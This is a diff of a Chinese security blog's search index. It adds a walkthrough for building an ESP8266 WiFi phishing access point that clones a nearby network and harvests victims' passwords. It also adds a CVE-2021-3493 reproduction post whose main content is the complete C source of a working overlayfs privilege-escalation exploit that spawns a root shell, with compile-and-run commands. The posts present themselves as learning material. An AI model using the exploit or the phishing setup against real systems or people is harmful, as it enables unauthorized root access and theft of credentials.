-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
-]]></content>
-      <categories>
-        <category>Linux安全</category>
-        <category>系统安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
@@ -959,6 +723,242 @@ app&#x3D;&quot;Joomla&quot; &amp;&amp; country&#x3D;&quot;CN&quot;<span aria-hid
       </categories>
       <tags>
         <tag>2021.3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackDemo钓鱼篇①——WiFi钓鱼</title>
+    <url>/2022/06/01/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>如今的生活中社工攻击屡见不鲜，其中钓鱼是最为有效而且危害最大的一种攻击手法。攻击者常会伪装成官方、管理员或上级领导向受害者发送信息核实的请求，一旦受害者粗心大意接受了此类请求，其个人信息就会存在泄露的风险。本篇将以一个简单的HackDemo为例子，复现黑客在WiFi钓鱼中的惯用思路，供大家学习和参考。</p>
+<a id="more"></a>
+
+<h3 id="实现工具"><a href="#实现工具" class="headerlink" title="实现工具"></a>实现工具</h3><ul>
+<li><p>Esp8266开发板CH340</p>
+</li>
+<li><p>flash_download_tools_v3.6.5烧录软件</p>
+</li>
+<li><p>DNS.ino.ino.nodemcu.bin烧录文件</p>
+</li>
+<li><p>Arduino IDE_v1.8.5</p>
+</li>
+<li><p>ESP8266 Sketch Data Upload插件</p>
+<p>链接：<a href="https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ">https://pan.baidu.com/s/1l7Z7BLVOLnfumrx4GRPVDQ</a><br>提取码：2jp2</p>
+</li>
+</ul>
+<h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><p>连接好Esp8266开发板，在设备管理器中可以查看到对应的端口，如果没有识别需要安装一下驱动(CH341SER.EXE)，默认下一步即可。<br><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/1.png" alt="图片"></p>
+<p>打开flash_download_tools_v3.6.5.exe对开发板进行烧录，点击选择ESP8266 DownloadTool</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/2.png" alt="图片"></p>
+<p>载入DNS.ino.ino.nodemcu.bin文件，选择80MHz、QIO、32Mbit、[对应的端口]、1152000，然后点击START进行烧录，等进度条跑完</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/3.png" alt="图片"></p>
+<p>这时我们发现有一个名字是HH的新wifi，如果没有可以尝试将开发板重新拔插一下。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/4.png" alt="图片"></p>
+<p>接下来安装Arduino，将工具包中tools目录下的内容拷贝到安装好的Arduino下的tools目录，可以发现在工具栏中多了两个插件。选择工具-&gt;开发板:”Arduino/Genuino Uno”-&gt;开发板管理器</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/8.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/5.png" alt="图片"></p>
+<p>在搜索框输入esp，选择下面的这个安装2.2.0版本</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/6.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/7.png" alt="图片"></p>
+<p>新建一个文件，保存到一个路径，然后点击工具-&gt;ESP8266 Sketch Data Upload，弹窗选择否，可以看到保存的文件目录下生成了data文件夹，我们将工具包里data目录下的三个html文件拷贝到生成的data文件夹里</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/9.png" alt="图片"></p>
+<p>选择工具栏下的开发板信息(按照自己的设备配置)，然后再次点击ESP8266 Sketch Data Upload</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/10.png" alt="图片"></p>
+<p>这个过程可能会进行1-2分钟，过程中开发板上的灯光长亮，等灯光熄灭就完成了</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.jpg" alt="图片"></p>
+<p>完成以后，连接HH，密码为m1234567，如果没有找到可以尝试重新拔插一下开发板或者重开一下电脑的wifi，连接上访问127.0.0.1/backdoor.html，这是钓鱼的后台，可以看到列出了附近的所有wifi，我们选择通用型，输入想要伪造的wifi序号，点击确认。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/11.png" alt="图片"></p>
+<p>跳转到提示SSID伪造成功</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/12.png" alt="图片"></p>
+<p>我们连接伪造的这个wifi，没有密码，自动跳转到钓鱼页面，如果受害者安全意识不强可能会填写管理员密码，至此鱼就上钩了。</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/13.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/14.png" alt="图片"></p>
+<p>受害者点击开始升级会跳转到一个进度条，这些都没什么用，只是给受害者看的。攻击者可以在backdoor看到钓到的密码，至此整个wifi钓鱼成功！</p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/15.png" alt="图片"></p>
+<p><img src="/images/HackDemo%E9%92%93%E9%B1%BC%E7%AF%87%E2%91%A0%E2%80%94%E2%80%94WiFi%E9%92%93%E9%B1%BC/16.png" alt="图片"></p>
+<p>小伙伴们还是要抱着练习的态度进行复现哦，以防走火入魔！</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1tU4y137yi?spm_id_from=333.999.0.0</a></p>
+]]></content>
+      <categories>
+        <category>社工安全</category>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>2022.6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【CVE-2021-3493】Linux kernel权限提升漏洞复现</title>
+    <url>/2021/04/25/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9ECVE-2021-3493%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。<br>linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
+<a id="more"></a>
+
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre class="line-numbers language-none"><code class="language-none">uname -a              显示电脑以及操作系统的相关信息
+cat &#x2F;etc&#x2F;issue        显示发行版本信息
+cat &#x2F;proc&#x2F;version     显示正在运行的内核版本
+lsb_release -a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/1.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><pre class="line-numbers language-none"><code class="language-none">gcc exploit.c -o exploit     编译
+chmod +x exploit             给执行权限
+.&#x2F;exploit                    执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可以看到前后权限有所提升，用户权限–&gt;管理员权限<br><img src="/images/Linuxkernel%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/2.png" alt="图片"></p>
+<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;exploit.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;sys&#x2F;types.h&gt;
+#include &lt;sys&#x2F;stat.h&gt;
+#include &lt;sys&#x2F;wait.h&gt;
+#include &lt;sys&#x2F;mount.h&gt;
+
+&#x2F;&#x2F;#include &lt;attr&#x2F;xattr.h&gt;
+&#x2F;&#x2F;#include &lt;sys&#x2F;xattr.h&gt;
+int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
+
+
+#define DIR_BASE    &quot;.&#x2F;ovlcap&quot;
+#define DIR_WORK    DIR_BASE &quot;&#x2F;work&quot;
+#define DIR_LOWER   DIR_BASE &quot;&#x2F;lower&quot;
+#define DIR_UPPER   DIR_BASE &quot;&#x2F;upper&quot;
+#define DIR_MERGE   DIR_BASE &quot;&#x2F;merge&quot;
+#define BIN_MERGE   DIR_MERGE &quot;&#x2F;magic&quot;
+#define BIN_UPPER   DIR_UPPER &quot;&#x2F;magic&quot;
+
+
+static void xmkdir(const char *path, mode_t mode)
+&#123;
+    if (mkdir(path, mode) &#x3D;&#x3D; -1 &amp;&amp; errno !&#x3D; EEXIST)
+        err(1, &quot;mkdir %s&quot;, path);
+&#125;
+
+static void xwritefile(const char *path, const char *data)
+&#123;
+    int fd &#x3D; open(path, O_WRONLY);
+    if (fd &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, path);
+    ssize_t len &#x3D; (ssize_t) strlen(data);
+    if (write(fd, data, len) !&#x3D; len)
+        err(1, &quot;write %s&quot;, path);
+    close(fd);
+&#125;
+
+static void xcopyfile(const char *src, const char *dst, mode_t mode)
+&#123;
+    int fi, fo;
+
+    if ((fi &#x3D; open(src, O_RDONLY)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, src);
+    if ((fo &#x3D; open(dst, O_WRONLY | O_CREAT, mode)) &#x3D;&#x3D; -1)
+        err(1, &quot;open %s&quot;, dst);
+
+    char buf[4096];
+    ssize_t rd, wr;
+
+    for (;;) &#123;
+        rd &#x3D; read(fi, buf, sizeof(buf));
+        if (rd &#x3D;&#x3D; 0) &#123;
+            break;
+        &#125; else if (rd &#x3D;&#x3D; -1) &#123;
+            if (errno &#x3D;&#x3D; EINTR)
+                continue;
+            err(1, &quot;read %s&quot;, src);
+        &#125;
+
+        char *p &#x3D; buf;
+        while (rd &gt; 0) &#123;
+            wr &#x3D; write(fo, p, rd);
+            if (wr &#x3D;&#x3D; -1) &#123;
+                if (errno &#x3D;&#x3D; EINTR)
+                    continue;
+                err(1, &quot;write %s&quot;, dst);
+            &#125;
+            p +&#x3D; wr;
+            rd -&#x3D; wr;
+        &#125;
+    &#125;
+
+    close(fi);
+    close(fo);
+&#125;
+
+static int exploit()
+&#123;
+    char buf[4096];
+
+    sprintf(buf, &quot;rm -rf &#39;%s&#x2F;&#39;&quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid &#x3D; getuid();
+    gid_t gid &#x3D; getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) &#x3D;&#x3D; -1)
+        err(1, &quot;unshare&quot;);
+
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;setgroups&quot;, &quot;deny&quot;);
+
+    sprintf(buf, &quot;0 %d 1&quot;, uid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;uid_map&quot;, buf);
+
+    sprintf(buf, &quot;0 %d 1&quot;, gid);
+    xwritefile(&quot;&#x2F;proc&#x2F;self&#x2F;gid_map&quot;, buf);
+
+    sprintf(buf, &quot;lowerdir&#x3D;%s,upperdir&#x3D;%s,workdir&#x3D;%s&quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&quot;overlay&quot;, DIR_MERGE, &quot;overlay&quot;, 0, buf) &#x3D;&#x3D; -1)
+        err(1, &quot;mount %s&quot;, DIR_MERGE);
+
+    &#x2F;&#x2F; all+ep
+    char cap[] &#x3D; &quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&quot;;
+
+    xcopyfile(&quot;&#x2F;proc&#x2F;self&#x2F;exe&quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &quot;security.capability&quot;, cap, sizeof(cap) - 1, 0) &#x3D;&#x3D; -1)
+        err(1, &quot;setxattr %s&quot;, BIN_MERGE);
+
+    return 0;
+&#125;
+
+int main(int argc, char *argv[])
+&#123;
+    if (strstr(argv[0], &quot;magic&quot;) || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], &quot;shell&quot;))) &#123;
+        setuid(0);
+        setgid(0);
+        execl(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;&#x2F;bin&#x2F;bash&quot;, &quot;--norc&quot;, &quot;--noprofile&quot;, &quot;-i&quot;, NULL);
+        err(1, &quot;execl &#x2F;bin&#x2F;bash&quot;);
+    &#125;
+
+    pid_t child &#x3D; fork();
+    if (child &#x3D;&#x3D; -1)
+        err(1, &quot;fork&quot;);
+
+    if (child &#x3D;&#x3D; 0) &#123;
+        _exit(exploit());
+    &#125; else &#123;
+        waitpid(child, NULL, 0);
+    &#125;
+
+    execl(BIN_UPPER, BIN_UPPER, &quot;shell&quot;, NULL);
+    err(1, &quot;execl %s&quot;, BIN_UPPER);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>更新Linux内核至5.11</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw">https://mp.weixin.qq.com/s/joPEtxkeffhpVjGYaqVApw</a><br><a href="https://blog.csdn.net/Appleteachers/article/details/116018035">https://blog.csdn.net/Appleteachers/article/details/116018035</a></p>
+]]></content>
+      <categories>
+        <category>Linux安全</category>
+        <category>系统安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.4</tag>
       </tags>
   </entry>
   <entry>
